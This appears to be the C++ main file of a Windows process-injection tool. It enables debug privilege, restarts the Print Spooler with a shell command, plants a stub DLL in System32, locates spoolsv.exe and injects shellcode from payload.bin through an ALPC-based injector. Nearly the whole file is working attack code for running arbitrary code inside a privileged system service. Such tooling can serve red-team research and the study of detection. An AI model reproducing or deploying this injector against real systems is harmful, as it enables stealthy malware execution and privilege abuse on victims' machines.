#pragma once

#include <iostream>
#include <vector>
#include <optional>
#include <fstream>
#include <windows.h>
#include <tlhelp32.h>
#include <functional>
#include <Psapi.h>
#include <nttpp.h>
#include "ALPCInjector.hpp"
#include <spdlog/spdlog.h>
#include <absl/strings/str_join.h>

namespace InjectorConstants
{
    const int ProcessNotFoundErrorCode = 3;
}

/**
 * The function "ReadPayload" reads the contents of a binary file and returns them as a vector of
 * unsigned characters.
 *
 * @param filePath The `filePath` parameter is a `std::string` that represents the path to the file
 * that needs to be read.
 *
 * @return The function `ReadPayload` returns a `std::vector<unsigned char>`.
 */
std::vector<unsigned char> ReadPayload(const std::string &filePath)
{
    std::ifstream inputFile(filePath, std::ios::binary);

    if (!inputFile.is_open())
    {
        std::cerr << "Error opening file: " << filePath << "\n";
        // Handle the error appropriately
        return {};
    }

    return {std::istreambuf_iterator<char>{inputFile}, {}};
}

/**
 * The function `GetProcessIdByExecutableName` retrieves the process ID of a running process based on
 * its executable name.
 *
 * @param targetExecutable The targetExecutable parameter is a string that represents the name of the
 * executable file for which we want to retrieve the process ID.
 *
 * @return a DWORD value, which represents the process ID of the target executable.
 */
DWORD GetProcessIdByExecutableName(const std::string &targetExecutable)
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot == INVALID_HANDLE_VALUE)
    {
        std::cerr << "Error creating process snapshot: " << GetLastError() << "\n";
        return 0;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &processEntry))
    {
        do
        {
            if (strcmp(processEntry.szExeFile, targetExecutable.c_str()) == 0)
            {
                CloseHandle(snapshot);
                return processEntry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return 0;
}

/**
 * The function checks if the current process is running with elevated privileges.
 *
 * @return a boolean value indicating whether the current process is elevated or not.
 */
bool IsCurrentProcessElevated()
{
    HANDLE hToken;
    BOOL bResult = FALSE;
    TOKEN_ELEVATION te;
    DWORD dwSize;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(TOKEN_ELEVATION), &dwSize))
        {
            bResult = te.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    return bResult;
}
/*
    Another solutions has to be found in future.
    Currently payload calls LoadLibrary without any absolute path, so it loads it straight from C:\Windows\System32
    A posible solutions is writing a dll path straight from injector somewhere in mmemory and use that in payload.
*/
bool MoveFileToSystem32()
{
    BOOL result = CopyFileA("stub.dll", "C:\\Windows\\System32\\test.dll", FALSE);
    if (!result)
    {
        spdlog::critical("Failed to copy stub.dll to C:\\Windows\\System32\\test.dll! [ERROR CODE {}]", GetLastError());
        return false;
    }
    return true;
}

void RestartSpoolerService()
{
    STARTUPINFO si = {};
    si.cb = sizeof(STARTUPINFO);
    GetStartupInfo(&si);

    PROCESS_INFORMATION pi = {};

    // is modified by the call to CreateProcess (unicode version).
    TCHAR szCmdLine[] = ("cmd.exe /C \"net stop spooler & net start spooler\"");

    // send shell command to restart our service.
    if (CreateProcess(NULL, szCmdLine, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi))
    {
        if (WaitForSingleObject(pi.hProcess, INFINITE) == WAIT_FAILED)
        {
            spdlog::error("WaitForSingleObject inifinte failed");
        }
    }
    std::this_thread::sleep_for(std::chrono::milliseconds(1500));
}
BOOL EnableDebugPrivilege(BOOL bEnable)
{
    HANDLE hToken = nullptr;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
        return FALSE;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
        return FALSE;
    TOKEN_PRIVILEGES tokenPriv;
    tokenPriv.PrivilegeCount = 1;
    tokenPriv.Privileges[0].Luid = luid;
    tokenPriv.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
        return FALSE;
    printf("Privileges error: %d\n", GetLastError());
    return TRUE;
}
typedef NTSTATUS(WINAPI* RtlGetVersionFunc)(PRTL_OSVERSIONINFOW lpVersionInformation);

void print_os_info()
{
   HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (hMod != nullptr) {
        RtlGetVersionFunc pRtlGetVersion = (RtlGetVersionFunc)GetProcAddress(hMod, "RtlGetVersion");
        if (pRtlGetVersion != nullptr) {
            RTL_OSVERSIONINFOW rovi = { 0 };
            rovi.dwOSVersionInfoSize = sizeof(rovi);

            if (pRtlGetVersion(&rovi) == 0) {
                std::wcout << L"Windows Version: " << rovi.dwMajorVersion << L"." << rovi.dwMinorVersion << L"." << rovi.dwBuildNumber << std::endl;
            } else {
                std::cerr << "Error getting Windows version." << std::endl;
            }
        } else {
            std::cerr << "Error finding RtlGetVersion function." << std::endl;
        }
    } else {
        std::cerr << "Error getting module handle for ntdll.dll." << std::endl;
    }
}

int main(int argc, char *argv[])
{

    spdlog::set_level(spdlog::level::debug);

   auto s1 = absl::StrCat("A string ", " another string", "yet another string");

    print_os_info();
    if (!IsCurrentProcessElevated())
    {
        std::cout << "Please run injector with administrator rights!\n";
        return 1;
    }

    EnableDebugPrivilege(TRUE);
    RestartSpoolerService();

    if (!MoveFileToSystem32())
        return 2;

    const auto targetPid = GetProcessIdByExecutableName("spoolsv.exe");

    if (targetPid == 0)
    {
        std::cout << "Spoolsv.exe couldn't be found!" << std::endl;
        return InjectorConstants::ProcessNotFoundErrorCode;
    }

    ALPCInjector injector;

    const auto payload = ReadPayload("payload.bin");

    std::cout << "Payload size " << payload.size() << std::endl;

    const InjectionResult result = injector.Inject(targetPid, payload);
    std::cout << "InjectionResult " << (int)result << std::endl;
    return 0;
}
